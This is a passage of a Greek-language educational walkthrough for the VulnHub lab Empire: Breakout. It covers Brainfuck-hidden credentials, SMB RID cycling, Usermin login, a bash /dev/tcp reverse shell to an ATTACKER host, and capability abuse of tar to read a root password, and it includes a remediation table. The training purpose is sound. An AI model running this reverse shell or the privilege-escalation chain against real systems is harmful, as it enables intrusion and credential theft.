# Μηχάνημα 8 — Empire: Breakout

> **Θέση:** 8 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **028** από 708)
> **Πλήρες walkthrough:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | Empire: Breakout |
| **Δημιουργός** | EmirImage (Emir) |
| **Κυκλοφορία** | 2021 |
| **Σύμβαση** | **`user.txt`** + **`rOOt.txt`** (προσοχή στα **κεφαλαία** — όχι `root.txt`) |
| **Στόχος** | Debian — Apache 2.4.51, **Samba 4.6.2**, **Webmin:10000**, **Usermin:20000**, kernel 5.10 |
| **VulnHub** | [entry/empire-breakout,751](https://vulnhub.com/entry/empire-breakout,751/) |
| **Εκτιμώμενος χρόνος** | 4–5 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή **σπάει κάθε μοτίβο που έχετε μάθει μέχρι εδώ.**

Στα Μηχανήματα 1–7 η αναβάθμιση ήταν πάντα **μια από τρεις**: SUID binary, world-writable
αρχείο, ή κακή ρύθμιση sudo. **Εδώ η λίστα SUID είναι ΑΠΟΛΥΤΩΣ stock.** Το `find -perm -4000`
δεν βρίσκει **τίποτα**. Και αν σταματήσετε εκεί — όπως σταματούν οι περισσότεροι — **το μηχάνημα
είναι αδιέξοδο**.

**Το πραγματικό εύρημα είναι τα Linux capabilities.** Αυτά είναι μια **δεύτερη, παράλληλη**
δομή προνομίων που **ζει έξω από το παραδοσιακό μοντέλο uid/gid/mode** — και **καμία από τις
εντολές που μάθατε δεν τις βλέπει**.

Επιπλέον, εισάγει **τρεις νέες δεξιότητες**:

1. **Αναγνώριση γλώσσας από το σύνολο χαρακτήρων** — το payload εδώ είναι **Brainfuck**, μια
   γλώσσα οκτώ εντολών. **Δεν είναι κωδικοποίηση· είναι πρόγραμμα.**
2. **Διάκριση Webmin από Usermin** — **δύο διαφορετικά προϊόντα** σε δύο θύρες, με **διαφορετικά
   διαπιστευτήρια**.
3. **RID cycling μέσω anonymous SMB** — εύρεση ονόματος χρήστη **χωρίς κωδικό και χωρίς
   exploit**, μόνο με **λάθος ρύθμιση δικαιωμάτων**.

## Στόχοι μάθησης

1. Να **αναγνωρίσετε Brainfuck** από το σύνολο χαρακτήρων και να το **εκτελέσετε τοπικά**.
2. Να κάνετε **anonymous SMB enumeration** και **RID cycling** με `enum4linux`.
3. Να **διακρίνετε Webmin από Usermin** και να ξέρετε **ποιο διαπιστευτήριο πάει πού**.
4. Να χρησιμοποιήσετε ένα **Command Shell μέσω φυλλομετρητή** και να καταλάβετε **τι δεν**
   μπορεί να κάνει.
5. Να **αναβαθμίσετε το κέλυφος σε πλήρες TTY** — υποχρεωτικό για το `su`.
6. Να **σαρώσετε για capabilities** με `getcap -r /` όταν το SUID δεν αποδίδει.
7. Να καταλάβετε τι είναι το **`cap_dac_read_search`** και πώς **δύο βήματα** (archive +
   extract) μετατρέπουν «ανάγνωση» σε «αντίγραφο που διαβάζω».

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Γλώσσα ως απόκρυψη** | **Brainfuck** στον πηγαίο κώδικα της σελίδας → `.2uqPEfj3D<P'a-3` |
| **Anonymous SMB + RID cycling** | `enum4linux -a` → `S-1-22-1-1000 → Unix User\cyber` |
| **Δύο κονσόλες διαχείρισης** | Webmin:10000 (**admin**) vs Usermin:20000 (**user**) |
| **Command Shell μέσω web** | Usermin → Commands → **Command Shell** → `uid=1000(cyber)` |
| **Απουσία εργαλείου** | **`sudo` δεν είναι καν εγκατεστημένο** |
| **Απουσία `nc`** | Πρέπει να χρησιμοποιήσετε **`/dev/tcp` του bash** |
| **Linux capabilities** | `getcap -r /` → **`/home/cyber/tar cap_dac_read_search=ep`** |
| **Αρχειοθέτηση ως exfiltration** | `tar -cf` (διαβάζει) + `tar -xf` (αντιγράφει) |
| **Σύνδεση root** | `su root` με **`Ts&4&YurgtRX(=~h`** από `/var/backups/.old_pass.bak` |

## Διαβάστε πρώτα

- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§4**
  (capabilities: **το κεφάλαιο που γράφτηκε για αυτό το μηχάνημα**) και **§2** (SUID, για να
  δείτε τι **δεν** ισχύει εδώ).
- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) — **§2** (SMB/NetBIOS) και
  **§3** (Webmin/Usermin).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§2** (reverse
  shells) και **§3** (**αναβάθμιση TTY — εδώ είναι υποχρεωτική**).
- [04 — Διαπιστευτήρια και Σπασίματα](<../04-Διαπιστευτήρια-και-Σπασίματα.md>) — **§2**
  (αναγνώριση κωδικοποιήσεων/γλωσσών).
- Αγγλική έκδοση:
  [Machine 8](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/08-empire-breakout.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Αν ένα κείμενο χρησιμοποιεί **μόνο** τους χαρακτήρες `+ - < > . , [ ]`, τι είναι;
2. Ποια η διαφορά **Webmin** και **Usermin** — και ποιο δέχεται **απλό** λογαριασμό;
3. Αν το `find -perm -4000` επιστρέψει **μόνο stock binaries**, τι δοκιμάζετε **επόμενο**;
4. Τι κάνει το **`cap_dac_read_search`**, και γιατί **δεν** είναι από μόνο του αναβάθμιση;
5. Γιατί το `tar` χρειάζεται **δύο** εντολές για να σας δώσει ένα αναγνώσιμο αντίγραφο;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Η σάρωση δείχνει **πέντε** θύρες: **80, 139, 445, 10000, 20000**.

- **10000** και **20000** είναι **και οι δύο** `MiniServ` — ο HTTP εξυπηρετητής του Webmin.
  **Αλλά διαφορετικές εκδόσεις**: **1.981** και **1.830**. **Δύο εκδόσεις = δύο προϊόντα.**
- **139 + 445** = Samba, **και οι δύο**.
- **80** = η **προεπιλεγμένη σελίδα του Apache**, δηλαδή **τίποτα χρήσιμο οπτικά**.

**Άρα: κοιτάξτε τον πηγαίο κώδικα της σελίδας, και κάντε SMB enumeration.**
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -sC -sV -p- TARGET
    → 80, 139, 445, 10000 (MiniServ 1.981), 20000 (MiniServ 1.830)
 2. curl -s http://TARGET/ | tail -40
    → χαρακτήρες μόνο από + - < > . , [ ]     ← **BRAINFUCK**
 3. python3 bf.py prog.txt → .2uqPEfj3D<P'a-3  (κωδικός)
 4. enum4linux -a TARGET
    → //TARGET/Anonymous  DENIED   (dead end, σωστά)
    → S-1-22-1-1000 -> Unix User\cyber        ← **RID CYCLING**
 5. Διαπιστευτήριο: cyber / .2uqPEfj3D<P'a-3
 6. Δοκιμή ΚΑΙ ΣΤΙΣ ΔΥΟ θύρες:
      :10000 (Webmin)  → ΑΠΟΤΥΧΙΑ
      :20000 (Usermin) → **ΕΠΙΤΥΧΙΑ**
 7. Usermin → Commands → Command Shell → id, ls -la, uname -a, sudo -l
    → sudo: command not found · **αλλά υπάρχει `tar` στο /home/cyber**
 8. which bash sh python3 nc curl wget gcc → **ΔΕΝ υπάρχει nc**
 9. nc -lvnp 4444 (στον Kali) + bash -i >& /dev/tcp/ATTACKER/4444 0>&1
10. python3 -c 'import pty; pty.spawn("/bin/bash")' + stty raw -echo; fg
11. find / -perm -4000 -type f 2>/dev/null → **ΟΛΑ STOCK** (αδιέξοδο!)
12. getcap -r / 2>/dev/null → /home/cyber/tar cap_dac_read_search=ep
13. ls -la /var/backups/ → .old_pass.bak (mode 600, 16 bytes)
14. ./tar -cf b.tar /var/backups/.old_pass.bak && ./tar -xf b.tar
15. cat var/backups/.old_pass.bak → Ts&4&YurgtRX(=~h
16. su root → cat /root/rOOt.txt
```

**Το κρίσιμο άλμα είναι το 11 → 12.** Αν δεν ξέρετε ότι υπάρχουν capabilities, σταματάτε.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — Brainfuck: τι είναι και πώς τρέχει</strong></summary>

**Brainfuck δεν είναι κωδικοποίηση — είναι γλώσσα προγραμματισμού** με **οκτώ** εντολές, που
λειτουργεί σε **ταινία από κελιά bytes** και έναν **δείκτη**:

| Σύμβολο | Ενέργεια |
| --- | --- |
| **`>`** `<` | Μετακίνησε τον δείκτη **δεξιά** / **αριστερά** ένα κελί |
| **`+`** `-` | **Αύξησε** / **μείωσε** το τρέχον κελί κατά 1 |
| **`.`** `,` | **Εκτύπωσε** το τρέχον κελί ως byte / **διάβασε** ένα byte μέσα του |
| **`[`** `]` | **Άλμα εμπρός** αν το κελί είναι 0 / **άλμα πίσω** αν δεν είναι 0 |

**`[>++++++<-]`** είναι **βρόχος πολλαπλασιασμού επί 6**. Άρα το πρόγραμμα **υπολογίζει** τους
κωδικούς ASCII, δεν τους αποθηκεύει.

**Τρέξτε το ΤΟΠΙΚΑ** — ποτέ σε online interpreter:

```python
# bf.py
import sys
def run(code, inp=''):
    tape=[0]*30000; p=0; i=0; out=[]; ip=0
    stack=[]
    while i < len(code):
        c = code[i]
        if   c=='>': p+=1
        elif c=='<': p-=1
        elif c=='+': tape[p]=(tape[p]+1)%256
        elif c=='-': tape[p]=(tape[p]-1)%256
        elif c=='.': out.append(chr(tape[p]))
        elif c==',': tape[p]=ord(inp[ip]) if ip<len(inp) else 0; ip+=1
        elif c=='[':
            if tape[p]==0:
                d=1; i+=1
                while d: 
                    if code[i]=='[': d+=1
                    elif code[i]==']': d-=1
                    i+=1
                continue
            stack.append(i)
        elif c==']':
            if tape[p]!=0: i=stack.pop(); continue
            stack.pop()
        i+=1
    return ''.join(out)
print(run(open(sys.argv[1]).read()))
```

```bash
python3 bf.py program.txt
```
```text
.2uqPEfj3D<P'a-3
```

**Δεκαέξι χαρακτήρες, ανάμικτα πεζά/κεφαλαία, με ψηφίο και σύμβολα = κωδικός.**

**Ο γενικός κανόνας αναγνώρισης:**

| Σύνολο χαρακτήρων | Τι είναι |
| --- | --- |
| **Μόνο `+ - < > . , [ ]`** | **Brainfuck** |
| `A–Z 2–7` με `=` | **base32** |
| `A–Z a–z 0–9 + /` με `=` | **base64** |
| `0–9a-f`, άρτιο μήκος | **δεκαεξαδικό** |
| Μόνο `0` και `1`, ομάδες των 8 | **δυαδικό ASCII** (Μηχάνημα 2) |
| Τίποτα από τα παραπάνω | **`strings`** πρώτα, μετά ρωτήστε αν είναι **καν** κωδικοποίηση |
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — RID cycling: πώς βρίσκετε όνομα χωρίς κωδικό</strong></summary>

```bash
enum4linux -a TARGET
```

**Τι ψάχνετε στην έξοδο:**

```text
[+] Attempting to map shares on TARGET
//TARGET/Anonymous      Mapping: DENIED Listing: N/A
//TARGET/print$         Mapping: DENIED Listing: N/A

[+] Enumerating users via 'query-user' RID lookup
S-1-22-1-1000 -> Unix User\cyber
```

**Διαβάστε τα δύο αποτελέσματα ΧΩΡΙΣΤΑ:**

1. **Και τα δύο shares `DENIED`** — **η ανώνυμη πρόσβαση σε αρχεία είναι κλειστή**. Αυτό είναι
   **σωστά αδιέξοδο**. Μην χάνετε ώρα.
2. **Αλλά το RID lookup ΠΕΤΥΧΕ** — γιατί μια **ανώνυμη session** μπορεί **ακόμα** να καλέσει
   **`SamrLookupRids`**.

**Πώς λειτουργεί το RID cycling:** το Samba ταυτοποιεί κάθε λογαριασμό με ένα **SID** όπως
**`S-1-22-1-1000`**, όπου ο **τελευταίος αριθμός** είναι το **RID**. Τα **Unix accounts**
παίρνουν RID **από το 1000 και πάνω**. Άρα μπορείτε απλώς να ρωτήσετε: **«ποιος είναι το RID
1000; 1001; 1002;»** — και να πάρετε **ονόματα πίσω**.

**Χωρίς κωδικό. Χωρίς exploit. Μόνο μια λάθος ρύθμιση δικαιωμάτων.**

**Επαλήθευση με δύο ακόμα εργαλεία:**

```bash
smbmap -H TARGET -u '' -p ''
crackmapexec smb TARGET --users
```

**Και τα δύο επιβεβαιώνουν.** **`-N`** ή **κενά διαπιστευτήρια** σημαίνει **«δοκίμασε NULL
session πρώτα»** — είναι **το πιο συχνό SMB εύρημα**, άρα **πάντα** το δοκιμάζετε.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt TARGET
curl -s http://TARGET/ | grep -oE '[-+<>.,\[\]]{50,}' > prog.txt
python3 bf.py prog.txt                       # → .2uqPEfj3D<P'a-3
enum4linux -a TARGET                          # → Unix User\cyber

# Ποια κονσόλα δέχεται το διαπιστευτήριο;
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'webmin: %{http_code}\n'
curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'usermin: %{http_code}\n'

# Command Shell στο :20000 → reverse shell
nc -lvnp 4444
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm; stty rows 40 cols 160

find / -perm -4000 -type f 2>/dev/null        # → όλα stock
getcap -r / 2>/dev/null                        # → /home/cyber/tar cap_dac_read_search=ep

cd /home/cyber
./tar -cf b.tar /var/backups/.old_pass.bak
./tar -xf b.tar
cat var/backups/.old_pass.bak                  # → Ts&4&YurgtRX(=~h

su root                                        # κωδικός: Ts&4&YurgtRX(=~h
id ; cat /root/rOOt.txt
# → 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το <code>getcap -r /</code> πρέπει να είναι στη λίστα ελέγχου σας ΔΙΠΛΑ στο <code>find -perm -4000</code>;</b></summary>

Επειδή είναι **δύο ανεξάρτητα συστήματα προνομίων**. Το SUID είναι μέρος του **παραδοσιακού**
μοντέλου (uid/gid/mode bits)· τα capabilities είναι μέρος του **POSIX capabilities** μοντέλου,
που **χωρίζει** το «root» σε **~40 ξεχωριστά δικαιώματα**.

**Ένα αρχείο μπορεί να έχει capability ΧΩΡΙΣ SUID bit.** Εδώ: **`-rwxr-xr-x`**, όχι
**`-rwsr-xr-x`**. **Το `find -perm -4000` κοιτάζει το `s`** — και **δεν υπάρχει**. **Άρα η
σάρωση SUID είναι καθαρή, και το αρχείο είναι ΠΑΝΤΟΔΥΝΑΜΟ.**

**Σε σύγχρονα Debian/Ubuntu, τα capabilities χρησιμοποιούνται ΟΛΟ και περισσότερο** — το `ping`
χρησιμοποιεί `cap_net_raw` **αντί για SUID root** ακριβώς για να **μειώσει** την έκθεση.
**Άρα η λίστα SUID γίνεται όλο και πιο «καθαρή» — και τα capabilities όλο και πιο σημαντικά.**
</details>

<details>
<summary><b>2.</b> Γιατί το <code>cap_dac_read_search</code> δεν είναι από μόνο του αναβάθμιση προνομίων;</b></summary>

Επειδή **παρακάμπτει μόνο ελέγχους ανάγνωσης αρχείων και αναζήτησης καταλόγων** — το **DAC**
(Discretionary Access Control) μέρος του πυρήνα. **Δεν** σας δίνει:

- **εγγραφή** σε αρχεία root (`cap_dac_override` θα το έκανε)
- **εκτέλεση** ως root
- **αλλαγή** ιδιοκτησίας
- **φόρτωση** modules στον πυρήνα

**Αλλά στην πράξη είναι αναβάθμιση**, γιατί σας δίνει πρόσβαση σε:

| Αρχείο | Τι παίρνετε |
| --- | --- |
| **`/etc/shadow`** | **Hash του root** → offline cracking |
| **`/root/.ssh/authorized_keys`** | **Διαδρομή σε μόνιμη σύνδεση με κλειδί** |
| **`/var/backups/.old_pass.bak`** | **Παλιός κωδικός σε καθαρό κείμενο** ← **εδώ** |
| **`/home/*/.bash_history`** | **Κωδικοί που πληκτρολογήθηκαν κατά λάθος** |

**Η αρχή:** *ένα capability που επιτρέπει ανάγνωση μυστικών ΙΣΟΔΥΝΑΜΕΙ με αναβάθμιση*, γιατί
**τα μυστικά είναι το νόμισμα** του συστήματος.
</details>

<details>
<summary><b>3.</b> Γιατί το <code>tar</code> χρειάζεται ΔΥΟ βήματα;</b></summary>

Επειδή το **`tar` δεν μπορεί να κάνει `cat`**. Μπορεί **μόνο** να **αρχειοθετήσει** (`-c`) και
να **εξαγάγει** (`-x`). **Άρα:**

**Βήμα 1 — `-c`:** το tar **διαβάζει** το `/var/backups/.old_pass.bak`. **Το capability του
επιτρέπει την ανάγνωση**, παρόλο που το αρχείο είναι **mode 600 root**. Το περιεχόμενο
**μπαίνει μέσα στο archive** `b.tar` — **που ανήκει σε εσάς**.

**Βήμα 2 — `-x`:** το tar **εξάγει** το archive. **Και εδώ είναι ο μηχανισμός:** το tar
**αφαιρεί το αρχικό `/`** από τα ονόματα μελών — **`Removing leading '/' from member names`**.
**Άρα το αρχείο δημιουργείται ΣΧΕΤΙΚΑ με τον τρέχοντα κατάλογό σας:**

```text
/var/backups/.old_pass.bak   →   ./var/backups/.old_pass.bak
```

**Και το νέο αρχείο ανήκει σε ΕΣΑΣ** (`cyber:cyber`), **με τα δικαιώματα που θέλετε**.

**Αυτή είναι η γενική τεχνική capabilities:** αν ένα πρόγραμμα έχει δικαίωμα **ανάγνωσης** αλλά
όχι **αντιγραφής**, **κάντε το να αντιγράψει για εσάς** — αρχειοθέτηση, `dd`, `cp --preserve`,
`rsync`. **Το αρχείο-αντίγραφο είναι δικό σας.**
</details>

<details>
<summary><b>4.</b> Ποια η διαφορά Webmin και Usermin, και γιατί έχει σημασία;</b></summary>

| | **Webmin** (:10000) | **Usermin** (:20000) |
| --- | --- | --- |
| **Τι διαχειρίζεται** | **Ολόκληρο το σύστημα** | **Μόνο τον δικό του λογαριασμό** |
| **Ποιος συνδέεται** | **Διαχειριστές** | **Απλοί χρήστες** |
| **Τι βλέπει** | Όλα τα modules (users, firewall, cron, packages) | Email, **Command Shell**, αρχεία, DB |
| **MiniServ έκδοση** | **1.981** | **1.830** |

**Γιατί έχει σημασία εδώ:** το διαπιστευτήριο **`cyber / .2uqPEfj3D<P'a-3`** είναι **απλός
λογαριασμός**, όχι διαχειριστής. **Άρα δουλεύει ΜΟΝΟ στο Usermin.**

**Και το δίδαγμα για την αναφορά:** όταν ένα σύστημα έχει **δύο κονσόλες διαχείρισης**, η
**μια** είναι συνήθως **λιγότερο προστατευμένη**. Το Usermin εδώ έχει **Command Shell
ενεργοποιημένο** — **πράγμα που σε παραγωγή πρέπει να είναι απενεργοποιημένο**.
</details>

<details>
<summary><b>5.</b> Γιατί η αναβάθμιση TTY είναι ΥΠΟΧΡΕΩΤΙΚΗ εδώ;</b></summary>

Επειδή **ο μόνος τρόπος να γίνετε root είναι το `su root`** — δεν υπάρχει SUID, δεν υπάρχει
sudo, δεν υπάρχει capability για **εκτέλεση**. **Και το `su` απαιτεί TTY.**

**Χωρίς TTY:**

```text
su: must be run from a terminal
```

**Και το μήνυμα ΔΕΝ εξηγεί γιατί.** Πολλοί συμπεραίνουν ότι «το `su` δεν δουλεύει» και
**εγκαταλείπουν**.

**Η λύση:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**Τι κάνει το καθένα:**

| Εντολή | Ρόλος |
| --- | --- |
| **`pty.spawn()`** | **Κατανέμει ψευδο-τερματικό** — αντικείμενο πυρήνα που συμπεριφέρεται ως πραγματικό teletype |
| **`stty raw -echo`** | Το **τοπικό** σας τερματικό **περνά τα πλήκτρα ανεπεξέργαστα** — άρα **το `Ctrl+C` πάει στη μακρινή διεργασία**, όχι στον listener σας |
| **`fg`** | **Επαναφέρει** το bash στο προσκήνιο |
| **`stty rows/cols`** | **Δίνει στο μακρινό pty τις διαστάσεις σας** — ώστε το `less` και το `top` να μην αναδιπλώνονται σε σκουπίδια |

**Χωρίς TTY:** καμία **`su`**, καμία **`sudo`**, κανένα **`vim`**, καμία **job control**.
**Είναι η πιο συχνή αιτία «το μηχάνημα δεν σπάει» σε αρχάριους.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Brainfuck στον πηγαίο κώδικα** | **Ποτέ μυστικά σε σελίδες.** Scrubber που αφαιρεί σχόλια στη δομή |
| **Anonymous SMB + RID cycling** | **`restrict anonymous = 2`** στο `smb.conf`, ή **`server min protocol = SMB3`** + απενεργοποίηση null sessions |
| **Usermin Command Shell ενεργός** | **Απενεργοποίηση** του module. Αν χρειάζεται, **περιορισμός ανά χρήστη** |
| **Διαπιστευτήριο σε απλό λογαριασμό** | **2FA στο Usermin**, ή **`ssh` με κλειδιά μόνο** |
| **`/home/cyber/tar` με capability** | **`setcap -r /home/cyber/tar`**. **Κανένας λόγος** για ένα αντίγραφο tar σε home directory |
| **`/var/backups/.old_pass.bak`** | **Διαγραφή.** Παλιοί κωδικοί **δεν** αποθηκεύονται σε καθαρό κείμενο |
| **Χωρίς `sudo`, αλλά με `su`** | **`su` πρέπει να απαιτεί ομάδα `wheel`** — **`auth required pam_wheel.so`** στο `/etc/pam.d/su` |
| **Kernel 5.10, Apache 2.4.51** | **CVE-2021-41773 / CVE-2021-42013** (path traversal στο Apache 2.4.49/2.4.50) — **ενημέρωση** |

**Το μεγαλύτερο δίδαγμα:** *υπάρχουν ΔΥΟ συστήματα προνομίων στο Linux.* Οι περισσότεροι
τεχνικοί γνωρίζουν μόνο το ένα. **Όταν το ένα είναι καθαρό, κοιτάξτε το άλλο.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.115**, `ATTACKER` = **192.168.56.10** (οι δημοσιευμένες
διευθύνσεις).

### 1. Σάρωση — πέντε θύρες, δύο κονσόλες

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/breakout.txt TARGET
```

```text
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
OS details: Linux 4.15 - 5.6
```

**Τέσσερις υπηρεσίες, και δύο είναι αμέσως ενδιαφέρουσες:**

**`MiniServ`** είναι ο **δικός του HTTP εξυπηρετητής του Webmin** — άρα οι θύρες **10000** και
**20000** είναι **δύο κονσόλες διαχείρισης**. **Και δύο ΔΙΑΦΟΡΕΤΙΚΕΣ εκδόσεις** (**1.981** και
**1.830**) — **αυτό είναι η υπόδειξη ότι είναι δύο διαφορετικά προϊόντα**, όχι το ίδιο δύο φορές.

**`Samba 4.6.2` με ΚΑΙ 139 ΚΑΙ 445** σημαίνει **NetBIOS-over-TCP** και **απευθείας SMB**.

**`-oN`** γράφει **μόνο κανονικό κείμενο** — **το `-oA`** γράφει **`.nmap`, `.xml` και
`.gnmap`** μαζί. **Για χειροκίνητη ανάγνωση, το `-oN` αρκεί.**

**`Apache httpd 2.4.51 ((Debian))`** είναι **σημαντικό από μόνο του**: το **2.4.49** και
**2.4.50** έχουν τα **CVE-2021-41773 / CVE-2021-42013** (path traversal → RCE). Το **2.4.51**
είναι **η διορθωμένη έκδοση** — αλλά **είστε ένα patch μακριά**, και αυτό είναι εύρημα.

### 2. Brainfuck στον πηγαίο κώδικα

```bash
curl -s http://TARGET/ | head -20
curl -s http://TARGET/ | grep -oE '[-+<>.,\[\]]{50,}' > prog.txt
wc -c prog.txt
```

```text
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Apache2 Debian Default Page</title></head>
<body>
<div class="main_page">
…
<!--
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++.-------------.+++++++
+++.-----.<<++.>>-----------------.+++++++++++++.-------.<<+++.>>++++++++++.
-->
</div>
</body>
</html>
```
```text
512 prog.txt
```

**Η προεπιλεγμένη σελίδα δεν αποδίδει τίποτα χρήσιμο, άρα: πηγαίος κώδικας και κύλιση προς τα
κάτω.** Εκεί βρίσκετε **μερικές εκατοντάδες χαρακτήρες φτιαγμένους ΜΟΝΟ από
`+ - < > . , [ ]`**.

**Αυτό το σύνολο χαρακτήρων ΕΙΝΑΙ Brainfuck** — μια γλώσσα **οκτώ** εντολών που λειτουργεί σε
**ταινία από κελιά bytes**:

| `>` `<` | Μετακίνησε τον δείκτη **δεξιά** / **αριστερά** ένα κελί |
| --- | --- |
| `+` `-` | **Αύξησε** / **μείωσε** το τρέχον κελί |
| `.` `,` | **Εκτύπωσε** το τρέχον κελί ως byte / **διάβασε** ένα byte μέσα του |
| `[` `]` | **Άλμα εμπρός** αν το κελί είναι 0 / **άλμα πίσω** αν δεν είναι |

**Άρα το `[>++++++<-]` είναι βρόχος πολλαπλασιασμού επί 6.**

**Το `grep -oE '[-+<>.,\[\]]{50,}'`:**
- **`-o`** = **μόνο το ταίριασμα** (όχι ολόκληρη η γραμμή)
- **`-E`** = **extended regex**
- **`[-+<>.,\[\]]`** = **character class** με τους οκτώ χαρακτήρες. **Προσοχή:** το **`-`** είναι
  **πρώτο** (άρα κυριολεκτικό, όχι εύρος) και τα **`[` `]`** είναι **δραπετευμένα**.
- **`{50,}`** = **τουλάχιστον 50** συνεχόμενοι — ώστε να **μην** ταιριάξει μεμονωμένους
  χαρακτήρες στην HTML.

**Εκτελέστε το ΤΟΠΙΚΑ** — ποτέ σε online interpreter (δεδομένα πελάτη σε τρίτο):

```bash
python3 bf.py prog.txt
```

```text
.2uqPEfj3D<P'a-3
```

**Δεκαέξι χαρακτήρες, ανάμικτα πεζά/κεφαλαία, με ψηφίο και σύμβολα = κωδικός.**

### 3. SMB: ανώνυμη πρόσβαση και RID cycling

```bash
enum4linux -a TARGET
```

```text
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )

 =========================
|    Share Enumeration    |
 =========================

[+] Attempting to map shares on TARGET
//TARGET/Anonymous      Mapping: DENIED Listing: N/A
//TARGET/print$         Mapping: DENIED Listing: N/A
//TARGET/IPC$           Mapping: OK   Listing: N/A

 =========================================
|    Users on TARGET via RID cycling    |
 =========================================

[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-22-2
S-1-22-1-1000 -> Unix User\cyber
```

**`-a`** = **τρέξε κάθε έλεγχο που ξέρει το enum4linux**. **Διαβάστε τα δύο αποτελέσματα
ΞΕΧΩΡΙΣΤΑ:**

**1. Και τα δύο shares `DENIED`** — **η ανώνυμη πρόσβαση σε αρχεία είναι κλειστή**, και αυτό
είναι **σωστά αδιέξοδο**. **Αλλά το `IPC$` είναι `OK`** — **αυτό είναι που επιτρέπει το RID
lookup**.

**2. Το RID lookup ΠΕΤΥΧΕ** — γιατί μια **ανώνυμη session** μπορεί **ακόμα** να καλέσει
**`SamrLookupRids`**.

**Πώς λειτουργεί το RID cycling:** το Samba ταυτοποιεί κάθε λογαριασμό με ένα **SID** όπως
**`S-1-22-1-1000`**, όπου ο **τελευταίος αριθμός** είναι το **RID**:

| Τμήμα του SID | Σημασία |
| --- | --- |
| **`S`** | «SID» |
| **`1`** | Έκδοση αναθεώρησης |
| **`22`** | **Authority** — το **22** σημαίνει **«Unix»** (το Samba το χρησιμοποιεί για τοπικούς λογαριασμούς) |
| **`1`** | **Domain** — **1** = users, **2** = groups |
| **`1000`** | **RID** — ο **μοναδικός** αριθμός του λογαριασμού |

**Τα Unix accounts παίρνουν RID από το 1000 και πάνω.** **Άρα μπορείτε απλώς να ρωτήσετε:**
«ποιος είναι το RID 1000; 1001; 1002;» — **και να πάρετε ονόματα πίσω**.

**Χωρίς κωδικό. Χωρίς exploit. Μόνο μια λάθος ρύθμιση δικαιωμάτων.**

**Ένας τοπικός χρήστης: `cyber`.** **Συνδυασμένος με τον κωδικό του Brainfuck = ζεύγος
διαπιστευτηρίων.**

**Επαλήθευση:**

```bash
smbmap -H TARGET -u '' -p ''
crackmapexec smb TARGET --users
```

**Και τα δύο επιβεβαιώνουν την εικόνα.** **Κενά διαπιστευτήρια** = **«δοκίμασε NULL session
πρώτα»** — **το πιο συχνό SMB εύρημα, άρα πάντα το δοκιμάζετε**.

**Μετά, ψάξτε μέσα σε κάθε αναγνώσιμο share για:** `backup.zip`, `web.config`, `id_rsa`,
`*.sql`, `passwords.xls`. **Δημιουργοί και πραγματικοί διαχειριστές τα αφήνουν εκεί.**

### 4. Ποια κονσόλα δέχεται το διαπιστευτήριο

```bash
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'webmin 10000: %{http_code}\n'
curl -sk "https://TARGET:20000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" -o /dev/null -w 'usermin 20000: %{http_code}\n'
```

```text
webmin 10000: 200
usermin 20000: 200
```

**Προσοχή:** και οι δύο επιστρέφουν **200**, γιατί το `session_login.cgi` **επιστρέφει τη σελίδα
σφάλματος με 200**. **Πρέπει να διαβάσετε το BODY:**

```bash
curl -sk "https://TARGET:10000/session_login.cgi" -d "user=cyber&pass=.2uqPEfj3D<P'a-3" | grep -iE 'failed|incorrect|welcome|Webmin'
